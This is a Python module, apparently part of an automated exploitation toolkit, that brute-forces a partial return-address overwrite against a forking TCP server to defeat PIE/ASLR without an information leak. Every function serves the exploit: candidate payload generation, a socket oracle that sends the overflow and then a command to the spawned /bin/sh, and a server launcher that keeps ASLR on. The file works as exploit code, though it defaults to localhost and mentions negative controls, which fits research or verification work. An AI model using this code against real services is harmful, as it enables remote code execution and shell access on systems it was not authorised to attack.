"""Leak-free PIE ret2win against a FORKING server (a BROP-style partial overwrite).

A one-shot process re-randomises its PIE base on every exec, so a leak-free partial overwrite can
only brute the 4 base bits in the second byte at ~1/16 per run -- probabilistic, and win() must sit
within ~64 KiB of the return site. A server that fork()s per connection is different: ASLR rolls
once at the parent's exec and every child INHERITS that layout, so the base is STABLE across
connections. That turns the brute DETERMINISTIC: the low byte of the return address is fixed by the
page offset, and the second byte carries the one unknown base nibble, so trying its 256 values is
GUARANTEED to hit win() -- no information leak, and in a bounded number of connections rather than a
1/16 gamble per process.

This module is the transport-agnostic core: it drives an `oracle(payload) -> output` callable, so
the byte-search is unit-tested against a simulated layout and reused over a real socket. The caller
confirms a real effect (a spawned shell evaluating a forgery-proof marker) and runs a negative
control; nothing here claims success on its own.
"""
from __future__ import annotations

import logging
import socket
import subprocess
import time
from pathlib import Path

_log = logging.getLogger(__name__)

_BYTE = range(256)


def candidate_overwrites(offset: int, win_off: int, *, aligns=(0, 1)):
    """Yield (payload, nbytes, align, second_byte) partial-overwrite candidates for a forking server
    whose layout is stable across connections.

    Byte 0 of the target return address is `(win_off+align) & 0xFF` -- deterministic, because the PIE
    base is page-aligned and contributes nothing below bit 12. A 1-byte overwrite hits when win() is
    in the same 256-byte block; otherwise byte 1 mixes the one unknown base nibble (bits 12-15) with
    the known page bits (8-11), so all 256 values of byte 1 are tried and one is guaranteed to land
    on win() when it is within 64 KiB of the return site. `aligns` covers win and win+1 (a system()
    call needs a 16-byte-aligned rsp; skipping the `push rbp` prologue flips the alignment)."""
    # 1-byte fast path for each alignment (win in the same 256-byte block).
    for align in aligns:
        b0 = (win_off + align) & 0xFF
        yield b"A" * offset + bytes([b0]), 1, align, None
    # 2-byte search (win within 64 KiB). INTERLEAVE the alignments: a system() call needs a
    # 16-byte-aligned rsp, so only one of win / win+1 works, and every attempt at the wrong
    # alignment crashes the child. Interleaving reaches the right alignment's correct second byte in
    # ~2*b1 connections instead of after a full wasted 256-attempt sweep of the other alignment.
    for b1 in _BYTE:
        for align in aligns:
            b0 = (win_off + align) & 0xFF
            yield b"A" * offset + bytes([b0, b1]), 2, align, b1


def brute_ret2win(oracle, offset: int, win_off: int, markers, *, aligns=(0, 1), cap: int = 600):
    """Drive `oracle(payload) -> output` with partial-overwrite candidates until a forking server's
    child reaches win() and its spawned shell EVALUATES the forgery-proof marker. Returns the winning
    (payload, nbytes, align) or None. Bounded by `cap` connections (2 aligns x (1 + 256) = 514)."""
    tried = 0
    for payload, nbytes, align, _b1 in candidate_overwrites(offset, win_off, aligns=aligns):
        if tried >= cap:
            break
        tried += 1
        if markers.proves(oracle(payload)):
            return payload, nbytes, align
    return None


# ------------------------------------------------------------------- socket transport (forking TCP)
def socket_oracle(port: int, follow: bytes, *, host: str = "127.0.0.1", timeout: float = 1.0,
                  gap: float = 0.15):
    """An `oracle(payload)` over a fresh TCP connection to a forking server: send the overflow, then
    `follow` (the marker command the spawned shell should evaluate), and return whatever comes back.
    A child that crashed on a wrong overwrite resets the connection and returns b"" -> not a win; a
    child that reached win()->system("/bin/sh") (with the client socket as its stdio) runs the
    command and returns its output, which `markers.proves` then grades."""
    def oracle(payload: bytes) -> bytes:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            s.sendall(payload)
            # Let the handler's single read() consume ONLY the overflow and return into win(): the
            # shell it spawns must read the marker command FRESH from the socket, not have it eaten
            # by the same read() that took the payload.
            if follow:
                time.sleep(gap)
                s.sendall(follow)
            chunks = []
            try:
                while True:
                    b = s.recv(4096)
                    if not b:
                        break
                    chunks.append(b)
            except socket.timeout:
                pass
            return b"".join(chunks)
        except OSError:
            return b""
        finally:
            try:
                s.close()
            except OSError:
                pass
    return oracle


def spawn_server(exe: str, argv, *, as_gb: int = 4, cpu_s: int = 120):
    """Spawn a server target once (its ASLR layout is then fixed for every forked child). Its own
    session so a kill reaps the whole group. Returns the Popen or None.

    The limits are deliberately LIGHT and -- unlike the fuzzing sandbox -- keep ASLR ON and do not
    cap the address space tightly: a BROP exploit's whole purpose is to defeat REAL ASLR with no
    leak, and the redirected child must be able to execve a shell, which the fuzzer's
    ADDR_NO_RANDOMIZE + tight RLIMIT_AS both break. A generous AS cap and no core dump still bound a
    runaway."""
    def _limits():
        import resource
        for res, val in ((resource.RLIMIT_CORE, (0, 0)),
                         (resource.RLIMIT_CPU, (cpu_s, cpu_s + 1)),
                         (resource.RLIMIT_AS, (as_gb << 30, as_gb << 30))):
            try:
                resource.setrlimit(res, val)
            except Exception:                            # noqa: BLE001
                pass
    try:
        return subprocess.Popen([str(exe)] + [str(a) for a in argv or []],
                                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL, start_new_session=True,
                                preexec_fn=_limits)
    except OSError:
        return None


def wait_for_port(proc, *, timeout: float = 5.0):
    """The TCP port the freshly-spawned server is listening on (read from /proc, no guessing), or
    None if it never listened. Reuses netfuzz's discovery so there is one definition of it."""
    from ..fuzz import netfuzz
    return netfuzz._wait_for_port(proc, "tcp", None, timeout)
